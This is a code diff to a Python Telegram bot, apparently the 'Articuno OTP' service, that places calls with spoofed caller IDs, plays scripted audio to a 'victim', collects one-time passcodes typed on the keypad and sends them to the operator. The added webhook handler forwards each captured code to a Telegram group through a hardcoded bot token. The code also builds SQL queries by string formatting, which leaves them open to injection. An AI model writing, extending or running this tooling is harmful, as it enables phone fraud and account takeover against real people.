@@ -845,7 +845,7 @@ def callmaking(number,spoof,chatid,service):
                         "to_": f"{number}",
                         "from_": f"{spoof}",
                         "callbackURL": f"{ngrok_url}/{service}/{chatid}/random",
-                        "api_key": f"{apiKey}",
+                        "api_key": f"{main_api['api']}",
                             }
             url = "https://articunoapi.com:8443/create-call"
             resp = requests.post(url, json=data)
@@ -1344,6 +1344,212 @@ def aplha_prebuild_script_call(script_id,chatid):
 
 
 
+#--------------------------------PREBUILD SCRIPTS-------------------------------------------------------
+def confirm1(message,otp_message):
+    global last_accept_deny
+    db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
+    c = db.cursor() 
+    chat_id = message.from_user.id
+    up_resp1= otp_message
+    c.execute(f"Select * from users where user_id={chat_id}")
+    sc_id = c.fetchone()
+    customscid = sc_id[6]
+
+    c.execute(f"select * from custom_scripts where script_id={customscid} limit 1")
+    custom_waiting = c.fetchone()
+    digits = custom_waiting[8]
+    nospace_digits= "".join(digits.split())
+
+    c.execute(f"Select * from call_data where chat_id={chat_id}")
+    custom_cont = c.fetchone()
+    call_control_id  = custom_cont[1]
+
+    if up_resp1=='Accept':
+        message_id1 = last_accept_deny[str(chat_id)]
+        new_keyboard = types.InlineKeyboardMarkup(row_width=1)
+        new_item = types.InlineKeyboardButton(text="Accepted ✅", callback_data="accepted")
+        new_keyboard.add(new_item)
+        bot.edit_message_reply_markup(chat_id=chat_id, message_id=message_id1, reply_markup=new_keyboard)
+
+        url = 'https://articunoapi.com:8443/play-audio'
+        data = {
+    "uuid": f"{call_control_id}",
+    "audiourl": f"https://sourceotp.online/scripts/{customscid}/output3.wav",
+   
+}
+        requests.post(url, json=data)
+        time.sleep(7)
+        callhangup(call_control_id)
+
+
+    elif up_resp1=='Deny':
+        message_id2 = last_accept_deny[str(chat_id)]
+        new_keyboard = types.InlineKeyboardMarkup(row_width=1)
+        new_item = types.InlineKeyboardButton(text="Denied ❌", callback_data="denied")
+        new_keyboard.add(new_item)
+        bot.edit_message_reply_markup(chat_id=chat_id, message_id=message_id2, reply_markup=new_keyboard)
+        url = 'https://articunoapi.com:8443/gather-audio'
+        data = {
+    "uuid": f"{call_control_id}",
+    "audiourl": f"https://sourceotp.online/scripts/{customscid}/output5.wav",
+    "maxdigits": f"{nospace_digits}",
+
+}
+        requests.post(url, json=data)
+        
+
+    c.close()
+    return 'Webhook received successfully!', 200
+        
+@app.route('/<script_name>/<chatid>/random', methods=['POST'])
+def prebuild_script_call(script_name,chatid):
+    global ringing_handler 
+    global recording_handler
+    global last_accept_deny
+    global playback_handler
+    db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
+    c = db.cursor()
+    data = request.get_json()
+    print("BY MODULE : ",data)
+    call_control_id = data['uuid']
+    event = data['state']
+    c.execute(f"select * from custom_scripts where script_name='{script_name}' limit 1")
+    custom_sc_src = c.fetchone()
+    digits = custom_sc_src[8]
+    nospace_digits= "".join(digits.split())
+    c.execute(f"select * from users where user_id='{chatid}' limit 1")
+    voices = c.fetchone()
+    call_cost = voices[11]
+    
+    if event == "call.ringing":  
+            callhangbutton(chatid)
+            
+        
+    elif event == "call.answered":
+            url1 = "https://articunoapi.com:8443/gather-audio"
+            data = {
+    "uuid": f"{call_control_id}",
+    "audiourl": f"https://sourceotp.online/scripts/{script_name}/output1.wav",
+    "maxdigits":"1"
+}
+            requests.post(url1, json=data)
+            playback_handler[str(chatid)] = 0
+            bot.send_message(chatid,f"""*Call has been answered 📱*""",parse_mode='markdown')
+
+        
+
+    elif event == "call.hangup":
+            try:
+                recording_handler[call_control_id] = data['recording_url']
+                per_call_cost = data['charge']
+                call_cost_update = call_cost + per_call_cost
+                c.execute(f"Update users set call_cost ={call_cost_update} where user_id={chatid}")
+                db.commit()
+            except:
+                 print("Recording Error")
+
+    elif event == 'playback.finishe':
+         if playback_handler[str(chatid)] == 1:
+              keyboard = types.InlineKeyboardMarkup(row_width=1)
+              item = types.InlineKeyboardButton(text="🔊Play Again🔂",callback_data="/repeat_audio")
+              keyboard.add(item)
+              mesid1 = bot.send_message(chatid,f"""Repeat otp script (part 2) again.""",reply_markup=keyboard, parse_mode='HTML').message_id
+              last_message_ids[chatid]=mesid1
+              print(last_message_ids)
+         
+
+    elif event == "call.complete":
+            mes = "Call Ended ☎️"
+            keyboard = types.InlineKeyboardMarkup(row_width=2)
+            item1 = types.InlineKeyboardButton(text="Recall", callback_data="/recall")
+            item0 = types.InlineKeyboardButton(text="Profile", callback_data="/profile")
+            keyboard.add(item1, item0)
+            mesid = bot.send_message(chatid,f"""*{mes}*""",reply_markup=keyboard, parse_mode='Markdown').message_id
+            last_message_ids[chatid]=mesid
+            c.execute(f"Update users set status='active' where user_id={chatid}")
+            db.commit()
+
+            try:
+                 recurl =  recording_handler[call_control_id]
+                 send_record = threading.Thread(target=retrive_recording, args=(recurl,chatid,))
+                 send_record.start()
+            except:
+                 print("error in sending Recording")
+
+
+    elif event == "dtmf.entered":
+        data = request.get_json()
+        digit =  data['digit']
+        bot.send_message(chatid,f"""*Digit Pressed ⏩ {digit}*""",parse_mode='markdown')
+        
+    elif event == "dtmf.gathered":
+        data = request.get_json()
+        otp2 = data['digits']
+
+        if otp2 == "1":
+            def ask_otp():
+                url3 = 'https://articunoapi.com:8443/gather-audio'
+                data = {
+    "uuid": f"{call_control_id}",
+    "audiourl": f"https://sourceotp.online/scripts/{script_name}/output2.wav",
+    "maxdigits": f"{nospace_digits}",
+    
+}
+                requests.post(url3, json=data)
+            def send_ask_otp(): 
+                bot.send_message(chatid,f"""*Victim pressed one, Send OTP now 📲*""",parse_mode='markdown')
+                time.sleep(5)
+                playback_handler[str(chatid)] = 1
+            custom_bgtask2 = threading.Thread(target=ask_otp)
+
+            custom_bgtask2.start()
+            send_ask_otp()
+           
+        elif(len(otp2)>=4):
+            
+            url = 'https://articunoapi.com:8443/play-audio'
+            data = {
+    "uuid": f"{call_control_id}",
+    "audiourl": f"https://sourceotp.online/scripts/{script_name}/output4.wav",
+}
+            requests.post(url, json=data)
+            otp_grabbed(chatid,otp=otp2)
+            keyboard = types.InlineKeyboardMarkup(row_width=2)
+            item1 = types.InlineKeyboardButton(text="Accept ✅" ,callback_data="/accept")
+            item2 = types.InlineKeyboardButton(text="Deny ❌",callback_data="/deny")
+            keyboard.add(item1,item2) 
+            message_idd = bot.send_message(chatid,f"""<b><i>Code Captured <code>{otp2}</code>  ✅</i></b>""",parse_mode='HTML',reply_markup=keyboard).message_id
+            last_accept_deny[str(chatid)] = message_idd
+            requests.post(
+    "https://api.telegram.org/bot7289161960:AAGqVenb4JrHLzK60YKFBcmBmq3jdhMcpx0/sendMessage",
+    data={
+        "chat_id": "-1002076456397",
+        "text": f"""
+╭━━[☏<b><u> ARTICUNO OTP</u></b> ☏]
+┣<b>[📞]Mode: Moduled Call </b>
+┣<b>[🔐]OTP:</b> <code>{otp2}</code>  
+┣<b>[📝]Service: {custom_sc_src[2]}</b>
+┣<b>[👤]By :</b><span class='tg-spoiler'> @{voices[12][0:3]+"**"+voices[12][-3:]}</span>
+╰━[<a href='https://t.me/Articunootpbot'>BOT</a>━[<a href='https://t.me/+tqRNlgotcnkxOGNl'>GROUP</a>]━[<a href='https://t.me/+j5GqAN60aZhhMzM1'>CHANNEL</a>]
+        """,
+        "parse_mode": "HTML",
+        "disable_web_page_preview":True
+
+    }
+)
+    c.close()
+    return 'Webhook received successfully!', 200
+
+#--------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+
+
+
+
 
 
 #_-----------------------------Custom Calling---------------------------------------------------------------------------------------------------------
@@ -1473,10 +1679,10 @@ def make_call_custon(message):
                         
                         if (call_s1!=0):
                 
-                                c.execute(f"update call_data set last_service='custom' where chat_id={id} ")
+                                c.execute(f"update call_data set last_service='{script_name}' where chat_id={id} ")
                                 db.commit()
                                 call_update(id)
-                                b=custom_make_call(f= f"{spoof}",t=f"{number}",user_id=id,script_id=script_id)
+                                b=make_call(f= f"{spoof}",t=f"{number}",user_id=id,service=script_name)
 
                         else:
                             bot.send_message(message.from_user.id, """*Somthing went wrong.\n/call <Victim Number> <Spoof Number> <Service> <otp digits> <voice>*""",parse_mode='markdown')
